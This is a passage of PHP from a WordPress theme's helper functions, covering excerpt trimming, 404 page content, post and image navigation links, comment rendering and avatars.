					if (strpos($part, '<') !== false || strpos($part, '>') !== false){
						$content[] = array('type'=>'tag', 'content'=>$part);
					} else {
						$all_chunks = preg_split('/([\s])/u', $part, -1, PREG_SPLIT_DELIM_CAPTURE);
						foreach($all_chunks as $chunk) {
							if('' != trim($chunk)) {
								$content[] = array('type'=>'word', 'content'=>$chunk);
								$word_count += 1;
							} elseif($chunk != '') {
								$content[] = array('type'=>'space', 'content'=>$chunk);
							}
						}
					}
				}

				if(($all_words < $word_count) && ($all_words + $min_remainder) <= $word_count) {
					$show_more_tag = true;
					$tag_disbalance = true;
					$current_count = 0;
					$excerpt = '';
					foreach($content as $node) {
						if($node['type'] == 'word') {
							$current_count++;
						} 
						$excerpt .= $node['content'];
						if ($current_count == $all_words){
							break;
						}
					}
					$excerpt .= '&hellip;'; // ...
				}
			}
		}
		if ($show_more_tag) {
			$excerpt = $excerpt.' <a class="more-link" href="'.$perma_link.'">'.$more_tag.'</a>';
		}
		if ($tag_disbalance) {
			$excerpt = force_balance_tags($excerpt);
		}
		return $excerpt;
	}
}

if (!function_exists('theme_get_search')){
	function theme_get_search(){
		ob_start();
		get_search_form();
		return ob_get_clean();
	}
}


function theme_is_home(){
	return (is_home() && !is_paged());
}


if (!function_exists('theme_404_content')){
	function theme_404_content() {
		$error_message = __( 'Apologies, but the page you requested could not be found. Perhaps searching will help.', THEME_NS);
		theme_post_wrapper(
			array(
					'title' => __('Not Found', THEME_NS),
					'content' => '<p class="center">' 
					. $error_message
					. '</p>' . "\n" . theme_get_search()
			)
		);
		if (theme_get_option('theme_show_random_posts_on_404_page')){
			ob_start(); 
			echo '<h4 class="box-title">' . theme_get_option('theme_show_random_posts_title_on_404_page') . '</h4>'; ?>
			<ul>
				<?php
					global $post;
					$rand_posts = get_posts('numberposts=5&orderby=rand');
					foreach( $rand_posts as $post ) :
				?>
				<li><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></li>
				<?php endforeach; ?>
			</ul>
			<?php theme_post_wrapper(array('content' => ob_get_clean()));
		}
		if (theme_get_option('theme_show_tags_on_404_page')){
			ob_start();
			echo '<h4 class="box-title">' . theme_get_option('theme_show_tags_title_on_404_page') . '</h4>';
			wp_tag_cloud('smallest=9&largest=22&unit=pt&number=200&format=flat&orderby=name&order=ASC');
			theme_post_wrapper(array('content' => ob_get_clean()));
		}
	}
}

if (!function_exists('theme_page_navigation')){
	function theme_page_navigation($args = '') {
		$args = wp_parse_args($args, array('wrap' => true, 'prev_link' => false, 'next_link' => false));
		$prev_link = $args['prev_link'];
		$next_link = $args['next_link'];
		$wrap = $args['wrap'];
		if (!$prev_link && !$next_link) {
			if (function_exists('wp_page_numbers')) { // http://wordpress.org/extend/plugins/wp-page-numbers/
				ob_start();
				wp_page_numbers();
				theme_post_wrapper(array('content' => ob_get_clean()));
				return;
			} 
			if (function_exists('wp_pagenavi')) { // http://wordpress.org/extend/plugins/wp-pagenavi/
				ob_start();
				wp_pagenavi();
				theme_post_wrapper(array('content' => ob_get_clean()));
				return;
			} 
			//posts
			$prev_link = get_previous_posts_link(__('Newer posts <span class="meta-nav">&rarr;</span>', THEME_NS));
			$next_link = get_next_posts_link(__('<span class="meta-nav">&larr;</span> Older posts', THEME_NS));
		}
		$content = '';
		if ($prev_link || $next_link) {

			$content = <<<EOL
	<div class="navigation">
		<div class="alignleft">{$next_link}</div>
		<div class="alignright">{$prev_link}</div>
	 </div>
EOL;
		}
		if ($wrap) {
			theme_post_wrapper(array('content' => $content));	
		} else {
			echo $content;
		}
	}
}

if (!function_exists('theme_get_previous_post_link')){

	function theme_get_previous_post_link($format='&laquo; %link', $link='%title', $in_same_cat = false, $excluded_categories = '') {
		return theme_get_adjacent_post_link($format, $link, $in_same_cat, $excluded_categories, true);
	}
}

if (!function_exists('theme_get_next_post_link')){
	function theme_get_next_post_link($format='%link &raquo;', $link='%title', $in_same_cat = false, $excluded_categories = '') {
		return theme_get_adjacent_post_link($format, $link, $in_same_cat, $excluded_categories, false);
	}
}

if (!function_exists('theme_get_adjacent_image_link')){
	function theme_get_adjacent_image_link($prev = true, $size = 'thumbnail', $text = false) {
		global $post;
		$post = get_post($post);
		$attachments = array_values(get_children( array('post_parent' => $post->post_parent, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => 'ASC', 'orderby' => 'menu_order ID') ));

		foreach ( $attachments as $k => $attachment )
			if ( $attachment->ID == $post->ID )
				break;

		$k = $prev ? $k - 1 : $k + 1;

		if ( isset($attachments[$k]) )
			return wp_get_attachment_link($attachments[$k]->ID, $size, true, false, $text);
	}
}

if (!function_exists('theme_get_previous_image_link')){
	function theme_get_previous_image_link($size = 'thumbnail', $text = false) {
		$result = theme_get_adjacent_image_link(true, $size, $text);
		if ($result) $result = '&laquo; ' . $result;
		return $result;
	}
}
	
if (!function_exists('theme_get_next_image_link')){
	function theme_get_next_image_link($size = 'thumbnail', $text = false) {
		$result = theme_get_adjacent_image_link(false, $size, $text);
		if ($result) $result .= ' &raquo;';
		return $result;
	}
}

if (!function_exists('theme_get_adjacent_post_link')){
	function theme_get_adjacent_post_link($format, $link, $in_same_cat = false, $excluded_categories = '', $previous = true) {
		if ( $previous && is_attachment() )
			$post = & get_post($GLOBALS['post']->post_parent);
		else
			$post = get_adjacent_post($in_same_cat, $excluded_categories, $previous);

		if ( !$post )
			return;

		$title = $post->post_title;

		if ( empty($post->post_title) )
			$title = $previous ? __('Previous Post', THEME_NS) : __('Next Post', THEME_NS);

		$title = apply_filters('the_title', $title, $post->ID);
		$short_title = $title;
		if (theme_get_option('theme_single_navigation_trim_title')) {
			$short_title = theme_trim_long_str($title, theme_get_option('theme_single_navigation_trim_len'));
		}
		$date = mysql2date(get_option('date_format'), $post->post_date);
		$rel = $previous ? 'prev' : 'next';

		$string = '<a href="'.get_permalink($post).'" title="'.esc_attr($title).'" rel="'.$rel.'">';
		$link = str_replace('%title', $short_title, $link);
		$link = str_replace('%date', $date, $link);
		$link = $string . $link . '</a>';

		$format = str_replace('%link', $link, $format);

		$adjacent = $previous ? 'previous' : 'next';
		return apply_filters( "{$adjacent}_post_link", $format, $link );
	}
}

if (!function_exists('get_previous_comments_link')) {
	function get_previous_comments_link($label)
	{
		ob_start();
		previous_comments_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_comments_link')) {
	function get_next_comments_link($label)
	{
		ob_start();
		next_comments_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('theme_comment')){
	function theme_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;
		
		
		switch ( $comment->comment_type ) :
		
			case '' :
		?>
		<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
			<?php ob_start(); ?>
			<div class="comment-author vcard">
				<?php echo theme_get_avatar(array('id' => $comment, 'size' => 48)); ?>
				<?php printf( __( '%s <span class="says">says:</span>', THEME_NS ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
			</div>
			<?php if ( $comment->comment_approved == '0' ) : ?>
				<em><?php _e( 'Your comment is awaiting moderation.', THEME_NS); ?></em>
				<br />
			<?php endif; ?>

			<div class="comment-meta commentmetadata"><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
				<?php
					printf( __( '%1$s at %2$s', THEME_NS ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)', THEME_NS), ' ' );
				?>
			</div>

			<div class="comment-body"><?php comment_text(); ?></div>

			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div>
			<?php theme_post_wrapper(array('content' => ob_get_clean(), 'id' => 'comment-'.get_comment_ID())); ?>


		<?php
				break;
			case 'pingback'  :
			case 'trackback' :
		?>
		<li class="post pingback">
		<?php ob_start(); ?>
			<p><?php _e( 'Pingback:', THEME_NS ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __('(Edit)', THEME_NS), ' ' ); ?></p>
		<?php theme_post_wrapper(array('content' => ob_get_clean(), 'class' => $comment->comment_type));
				break;
		endswitch;
	}
}

if (!function_exists('theme_get_avatar')){
	function theme_get_avatar($args = ''){
	$args = wp_parse_args($args, array('id' => false, 'size' => 96, 'default' => '', 'alt' => false, 'url' => false));
	extract($args);
		$result = get_avatar($id, $size, $default, $alt);
		if ($result) {
			if ($url){
				$result = '<a href="'.esc_url($url).'">' . $result . '</a>';
			}
			$result = '<div class="avatar">' . $result . '</div>';
		}
		return $result;
	}
}

if (!function_exists('get_post_format')){
	function get_post_format(){
		return false;
	}
};?>
